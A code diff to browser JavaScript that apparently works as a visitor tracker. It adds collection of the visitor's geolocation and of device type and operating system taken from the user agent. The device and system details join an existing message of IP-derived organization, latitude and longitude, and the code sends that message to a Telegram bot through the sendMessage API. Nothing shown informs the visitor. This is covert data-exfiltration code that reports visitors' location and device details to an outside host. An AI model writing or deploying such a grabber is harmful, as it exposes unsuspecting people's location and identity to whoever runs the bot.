@@ -139,8 +139,54 @@ let organization;
 let accuracy;
 let latitude;
 let longitude;
+let device_Type;
+let operating_System;
+
+//for fine location
+
+
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(
+    function(position) {
+      const l_latitude = position.coords.latitude;
+      const l_longitude = position.coords.longitude;
+      console.log('Lat:', l_latitude);
+      console.log('Long:', l_longitude);
+    },
+    function(error) {
+      console.error('Error getting location:', error);
+    }
+  );
+} else {
+  console.log('Geolocation is not supported by this browser.');
+}
+
+
+
+
 
 const ipUrl = 'https://api.ipify.org?format=json';
+
+
+// Get device type
+var deviceType = /Mobi/.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+// Get operating system
+var operatingSystem = '';
+if (/Windows/.test(navigator.userAgent)) {
+  operatingSystem = 'Windows';
+} else if (/Mac/.test(navigator.userAgent)) {
+  operatingSystem = 'MacOS';
+} else if (/Linux/.test(navigator.userAgent)) {
+  operatingSystem = 'Linux';
+} else if (/Android/.test(navigator.userAgent)) {
+  operatingSystem = 'Android';
+} else if (/iOS/.test(navigator.userAgent)) {
+  operatingSystem = 'iOS';
+} else {
+  operatingSystem = 'Unknown';
+}
+
 
 (async () => {
   try {
@@ -174,7 +220,10 @@ const ipUrl = 'https://api.ipify.org?format=json';
                     \nOrganization: ${organization},
                     \nAccuracy: ${accuracy},
                     \nLatitude: ${latitude},
-                    \nLongitude: ${longitude}`;
+                    \nLongitude: ${longitude},
+                    \nDevice Type: ${deviceType},
+                    \nOperating System: ${operatingSystem}`;
+
     const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${message}`;
     const telegramResponse = await fetch(telegramUrl);
     const telegramData = await telegramResponse.json();
